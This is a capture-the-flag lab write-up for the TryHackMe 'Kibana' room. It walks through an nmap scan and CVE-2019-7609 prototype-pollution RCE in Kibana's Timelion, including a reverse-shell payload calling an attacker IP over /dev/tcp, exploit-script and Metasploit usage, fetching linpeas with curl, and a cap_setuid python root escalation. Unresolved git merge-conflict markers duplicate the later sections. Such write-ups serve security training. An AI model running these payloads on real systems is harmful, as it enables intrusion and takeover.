Before you begin, always add your ip address to hosts file so as to avoid burden especially ip address related operations, while you are actively pentesting.

How to apply ?

![](./images/cf3a2e5dd2d551b8640a2d493f3ee36f.png)

## Reconnaissance
 nmap payload:
└─# sudo nmap -sV -sC -p- kiba.thm

Unusual port number:

![](./images/e8a15745496651c4b5b275912f8c037d.png)

![](./images/c449e8ca809ba166e891781ff3d6294a.png)

What is Kibana ?
![](./images/f63b01787e995edea417abe07af45384.png)

Suspicious path:
http://kiba.thm:5601/app/timelion#



## Exploitation

Useful resources about vulnerability:
- https://github.com/LandGrey/CVE-2019-7609
- https://github.com/mpgn/CVE-2019-7609

For the exploitation phase we have two manual ways to compromise the target. Besides, you can also use automated approach by using `Metasploit Framework`

- Manual exploitation on `Timelion` data visualiser script executor.
- Customized script execution.
- Metasploit Framework: `linux/http/kibana_timelion_prototype_pollution_rce` module.

### Manual Exploitation - 1

After a couple of research process, I discovered the vulnerability itself which is **Prototype Pollusion** on **Timelion** feature of the **Kibana** - ElasticSearch supported and opensource data visualization platform.

![](./images/729ac78be8e9db4f7c4fed3c058becbc.png)


Initial compromise:
- Used Payload:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.69.113/1337 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

- Netcat listener:
```
nc -lvnp 1337
```


Reverse Shell PoC:
![](./images/c01fde4a727b62e56d674dae6346ddbf.png)



### Manual Exploitation - 2

Although I have taken reverse shell connection properly, trying a python script where I discovered the vulnerability that trigger RCE automatically.

```
# python2 CVE-2019-7609-kibana-rce.py -h

usage: CVE-2019-7609-kibana-rce.py [-h] [-u URL] [-host REMOTE_HOST]
                                   [-port REMOTE_PORT] [--shell]

optional arguments:
  -h, --help         show this help message and exit
  -u URL             such as: http://127.0.0.1:5601
  -host REMOTE_HOST  reverse shell remote host: such as: 1.1.1.1
  -port REMOTE_PORT  reverse shell remote port: such as: 8888
  --shell            reverse shell after verify

```

I will execute a payload below:

```
python2 CVE-2019-7609-kibana-rce.py -u http://10.10.163.241:5601 -host 10.11.69.113 -port 1234 --shell
```

However, it did not call back on my machine. After on my first shot, I got break-time and turn on hybrid mode on my system. Therefore, I am going to refresh the machine.

![](./images/d24a174170333ddd84070e2414595cc2.png)

![](./images/eaaad08b9760b6b943ea9af458e1c8cd.png)


Now it works ! After I restarted the machine, I was able to get my reverse shell !

![](./attachment/11df5f7c7c9ac5dfcab4d51099732301.png)


### Automated Exploitation

`Metasploit Framework` offers only three modules for **Kibana** platform. However, first approach was suitable for me. You can reach out the related module in below.

![](./images/c59ebbaa12eec0413d0a11bff25962e1.png)

To interact with correlated module:

```
use 0
```

Now you are ready to configure module specific settings.

In order to show options required by the module, use the below command:

```
show options
```

![](./images/c53a369d6204c98af36def3009c7b52d.png)

Modifying the `RHOSTS`, `TARGETURI` and `RPORT` is enough to execute our exploit.

To add necessary information to script settings:

```
set [needed attribute]

Example: set RHOSTS or set RPORT
```

For this scenario, do not forget to modify *RHOSTS*, *LHOST* and *LPORT*.

![](./images/a20b149b5028537d238919c11e7979b7.png)

Since I forgot to give `LHOST` and `LPORT` option, I was not able to run the script appropriately. That's why, do not forget to `set` them.

As you can see below, the script was successfully run:

![[Screen Shot 2024-10-04 at 15.27.38.png]]

Initially, there will not be any output prompted from target ,so do not worry about it. Just check whether you correctly get reverse shell connection or not.

To achieve this just run `ls` command.


## Post-Exploitation

I have tried to run `linpeas.sh` on `tmp` folder which allows users to run many scripts here ,but in this scenario it does not work. Therefore, I uploaded my files through `/home/kiba`. Then it worked !

1. Deploy python server from local
```
python -m http.server 3131
```

2. Download `linpeas.sh` from victim machine
```
curl http://10.11.69.113:3131/linpeas.sh -o linpeas.sh
```

3. Give executable permission to `linpeas.sh`
```
chmod +x linpeas.sh
```

4. Examine carefully  the `linpeas` output:

- I found really useful evidence to escalate our privileges

<<<<<<< Updated upstream:TryHackMe/Kibana/Kibana.md
![](./images/privilege.PNG)
=======
- The crontab shows that the user `kiba` has a cron job scheduled to run every minute. This job navigates to the directory `/home/kiba/kibana/bin` and runs the `bash kibana` command.

![[Screen Shot 2024-10-04 at 11.53.47.png]]



![[Screen Shot 2024-10-04 at 11.46.43 1.png]]
>>>>>>> Stashed changes:TryHackMe/Kibana- TryHackMe/Kibana - TryHackMe.md

- The crontab shows that the user Kiba has a cron job scheduled to run every minute. This job navigates to the directory /home/kiba/kibana/bin and runs the bash kibana command.

<<<<<<< Updated upstream:TryHackMe/Kibana/Kibana.md
![](./images/1.png)

![](./images/sudo.png)

We have a possible privilege escalation vector known as Sudo Privileges:

Since Kiba is in the sudo group, check what commands you can run with sudo -l.

It did not work in this scenario:

```
  whoami
  kiba
  sudo -l
  sudo: no tty present and no askpass program specified
```

Furthermore, we have a binary named /home/kiba/.hackmeplease/python3, which has the capability cap_setuid+ep, which means that this Python binary can change user IDs (setuid). This is a potential privilege escalation vector since it allows the Python process to execute with elevated privileges.

![](./images/2.PNG)

Let me pay attention on .hackmeplease :D

![](./images/3.PNG)


Since we have the python3 binary and its vulnerability. In binary exploitation, we trust GFTOBins to escalate privileges:

https://gtfobins.github.io/gtfobins/python/


- On GFTOBins, we have many binaries available to elevate our privileges. However, today, we should look for Python binary. After a deep dive attempt, I recognized that I was dealing with cap_setuid+ep capability. Therefore, using this payload to escalate my privileges will be suitable.


![alt text](./images/4.PNG)

### Conclusion
All in all, this article demonstrates how different penetration testing methodologies can be used. From reconnaissance to post-exploitation, I provided three vital pathways for you to understand the idea behind the scene. The detailed steps, ranging from mapping out unusual ports (Kibana) to exploiting vulnerability and escalating privilege show the significance of understanding each phase deeply. Following the steps, applying knowledge practically, and adapting to challenges are crucial. Always remember that careful planning and paying attention to small details, such as setting up the Metasploit console or configuring script parameters correctly, can save you much trouble during the engagement
=======
We have possible privilege escalation vector known as Sudo Privileges: 
Since `kiba` is in the `sudo` group, check what commands you can run with `sudo -l`.

It did not work on this scenario:

```
	whoami
	kiba
	sudo -l
	sudo: no tty present and no askpass program specified
```

Furthermore, we have a binary named `/home/kiba/.hackmeplease/python3` which has the capability `cap_setuid+ep`, which means that this Python binary has the ability to change `user IDs (setuid)`. This is a potential privilege escalation vector since it allows the Python process to execute with elevated privileges.

![[Screen Shot 2024-10-04 at 11.56.02.png]]

Let me pay attention on `.hackmeplease` :D

![[Screen Shot 2024-10-04 at 15.45.17.png]]


Since we have `python3` binary and its vulnerability. In binary we trust `GFTOBins` to escalate privileges:

- GFTOBins[https://gtfobins.github.io/gtfobins/python/]


On `GFTOBins` we have a lot of binaries available to elevate our privileges. However, today we should look for `python` binary. After a deep dive attempts, I recognized that I was dealing with `cap_setuid+ep` capability. Therefore, I thought that it will be suitable to use this payload to escalate my privileges.

![[Screen Shot 2024-10-04 at 15.50.11.png]]

- You can execute following command to be `root` on target.

```
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Conclusion

All in all, this writeup demonstrates how different methodologies can be used at once. Through reconnaissance to post-exploitation, I provided 3 strong pathway you to understand the idea behind the scene. The detailed steps, ranging from mapping out unusual ports (Kibana) to `exploiting vulnerability` and `escalating privilege`, show the significance of understanding each phase deeply. It's crucial not only to follow the steps meticulously but also to apply knowledge practically and adapt to challenges as they arise. Always remember, careful planning and paying attention to small details, such as setting up the Metasploit console or configuring script parameters correctly, can save you a lot of trouble during the engagement.

May The Pentest Be With You ! !
>>>>>>> Stashed changes:TryHackMe/Kibana- TryHackMe/Kibana - TryHackMe.md
